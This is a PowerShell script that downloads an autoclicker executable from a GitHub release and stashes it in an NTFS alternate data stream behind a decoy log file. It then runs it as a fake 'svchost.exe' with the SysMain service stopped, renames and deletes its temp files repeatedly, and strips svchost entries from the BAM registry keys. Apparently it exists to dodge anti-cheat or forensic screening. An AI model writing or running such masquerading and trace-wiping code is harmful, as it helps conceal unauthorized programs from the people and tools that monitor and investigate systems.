$rnd = -join ((48..57) | Get-Random -Count 4 | ForEach-Object {[char]$_})
$tempName = "$rnd.tmp"
$tempPath = Join-Path $env:TEMP $tempName
$exeUrl = 'https://github.com/Steve987321/toadclicker/releases/download/v1.7.8/Toad.exe'
$hostFile = "$env:TEMP\update.log"
$adsName = "svchost.exe"
Write-Host "[*] Downloading executable from $exeUrl" -ForegroundColor Cyan
Write-Host "    Destination: $tempPath"
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -ErrorAction Stop
    Write-Host "[+] Download completed successfully" -ForegroundColor Green
}
catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $hostFile)) {
    New-Item -Path $hostFile -ItemType File -Force | Out-Null
    Write-Host "[+] Host file created: $hostFile" -ForegroundColor Green
}
try {
    Get-Content $tempPath -Encoding Byte -ReadCount 0 | Set-Content -Path "${hostFile}:${adsName}" -Encoding Byte
    Write-Host "[+] ADS created successfully: ${hostFile}:${adsName}" -ForegroundColor Green
}
catch {
    Write-Host "[!] Failed to create ADS: $_" -ForegroundColor Red
    exit 1
}
$tempExe = Join-Path $env:TEMP "svchost.exe"
try {
    Get-Content "${hostFile}:${adsName}" -Encoding Byte -ReadCount 0 | Set-Content -Path $tempExe -Encoding Byte
    Write-Host "[+] Executable extracted to: $tempExe" -ForegroundColor Green
    sc.exe stop SysMain | Out-Null
    Write-Host "[*] SysMain service stopped" -ForegroundColor Cyan
    Start-Process $tempExe
    Write-Host "[*] Process started: $tempExe" -ForegroundColor Cyan
}
catch {
    Write-Host "[!] Failed to extract or execute file: $_" -ForegroundColor Red
    exit 1
}
Write-Host "`n[*] Cleaning temporary files" -ForegroundColor Cyan
$deleteTmp = Read-Host "    Delete temporary files? [Y/N]"

function Rename-And-Delete {
    param (
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        Write-Host "    [!] File not found: $filePath" -ForegroundColor DarkRed
        return
    }

    $letters = 'A','B','C','D','E','F','G','H','I','J'
    $dir = Split-Path $filePath

    foreach ($letter in $letters) {
        $namePart = $letter * 12
        $extPart = $letter * 10
        $newName = "$namePart.$extPart"
        $newPath = Join-Path $dir $newName
        try {
            Rename-Item -Path $filePath -NewName $newName -Force -ErrorAction Stop
            Write-Host "    [~] Renamed to: $newName" -ForegroundColor DarkYellow
            $filePath = $newPath
        } catch {
            Write-Host "    [!] Failed to rename to $newName : $($_.Exception.Message)" -ForegroundColor Red
            break
        }
    }

    try {
        Remove-Item -Path $filePath -Force -ErrorAction Stop
        Write-Host "    [+] File deleted successfully" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Failed to delete file: $($_.Exception.Message)" -ForegroundColor Red
    }
}

if ($deleteTmp -eq "Y" -or $deleteTmp -eq "y") {
    $maxWait = 30
    $waited = 0
    Write-Host "    [*] Checking for running svchost processes..." -ForegroundColor Cyan

    while ((Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $tempExe }) -and ($waited -lt $maxWait)) {
        Write-Host "        Waiting for svchost.exe to exit... ($waited/$maxWait)" -ForegroundColor DarkGray
        Start-Sleep -Seconds 1
        $waited++
    }
    if ($waited -ge $maxWait) {
        Write-Host "    [!] Timeout waiting for svchost.exe to exit" -ForegroundColor Red
    }
    try {
        if (Test-Path $tempPath) {
            Rename-And-Delete -filePath $tempPath
        }

        if (Test-Path $tempExe) {
            Rename-And-Delete -filePath $tempExe
        }

        Write-Host "    [+] Temporary files cleaned successfully" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Error cleaning temp files: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "    [*] Temporary file deletion skipped" -ForegroundColor Cyan
}
sc.exe start SysMain | Out-Null
Write-Host "[*] SysMain service started" -ForegroundColor Cyan

function Remove-BamRegistryEntries {
    $basePath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $found = $false
    $removedCount = 0
    Write-Host "`n[*] Scanning BAM registry for svchost entries..." -ForegroundColor Cyan
    try {
        $sids = Get-ChildItem -Path $basePath -ErrorAction Stop | Select-Object -ExpandProperty PSChildName

        foreach ($sid in $sids) {
            $fullPath = "$basePath\$sid"
            try {
                $props = Get-ItemProperty -Path $fullPath -ErrorAction Stop
                foreach ($prop in $props.PSObject.Properties) {
                    $remove = $false
                    if ($prop.Name.ToLower() -like "*svchost*") {
                        $remove = $true
                    } else {
                        try {
                            $val = Get-ItemPropertyValue -Path $fullPath -Name $prop.Name -ErrorAction Stop
                            if ($val -and $val.ToString().ToLower() -like "*svchost*") {
                                $remove = $true
                            }
                        } catch {}
                    }
                    if ($remove) {
                        try {
                            Remove-ItemProperty -Path $fullPath -Name $prop.Name -Force -ErrorAction Stop
                            Write-Host "    [X] Removed: $($prop.Name) from ${sid}" -ForegroundColor Yellow
                            $found = $true
                            $removedCount++
                        } catch {
                            Write-Host "    [!] Failed to remove $($prop.Name) from ${sid}: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                }
            } catch {
                Write-Host "    [!] Cannot access: ${sid}" -ForegroundColor DarkGray
            }
        }
        if ($found) {
            Write-Host "[+] Cleanup complete. Removed entries: $removedCount" -ForegroundColor Green
        } else {
            Write-Host "[*] No svchost entries found in BAM" -ForegroundColor Cyan
        }
    } catch {
        Write-Host "[!] Error accessing BAM registry: $($_.Exception.Message)" -ForegroundColor Red
    }
}
Remove-BamRegistryEntries
Write-Host "`n[+] Operation completed successfully" -ForegroundColor Green
Read-Host "Press Enter to exit"
